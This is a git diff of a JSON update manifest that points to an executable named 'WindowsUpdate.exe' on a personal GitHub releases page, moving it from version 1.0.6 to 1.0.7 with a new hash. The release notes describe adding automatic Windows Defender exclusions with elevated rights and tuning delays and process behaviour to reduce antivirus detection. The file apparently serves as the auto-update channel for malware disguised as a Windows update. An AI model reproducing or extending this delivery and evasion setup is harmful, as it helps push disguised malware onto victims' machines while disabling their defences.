@@ -1,6 +1,6 @@
 ﻿{
-    "url":  "https://github.com/sayamuhbani59-collab/homectrl-updates/releases/download/v1.0.6/WindowsUpdate.exe",
-    "sha256":  "76a304ed7e994c2e87e2e46f25632717ff73b485a14c05f93eb59e5d5949bf2a",
-    "version":  "1.0.6",
-    "notes":  "Auto Defender exclusion (elevated), --install-admin flag, plain PS instead of EncodedCommand"
+    "url":  "https://github.com/sayamuhbani59-collab/homectrl-updates/releases/download/v1.0.7/WindowsUpdate.exe",
+    "sha256":  "a5798378f28e1a887510fb8d34a0b85e7f0a4620c39843ef1c873b9800a9c7e0",
+    "version":  "1.0.7",
+    "notes":  "Reduced AV heuristics: 30-90s Discord warmup, 5-15min autoupdate delay, 5-10min tool-install delay, gentle process takedown (only if file locked)"
 }
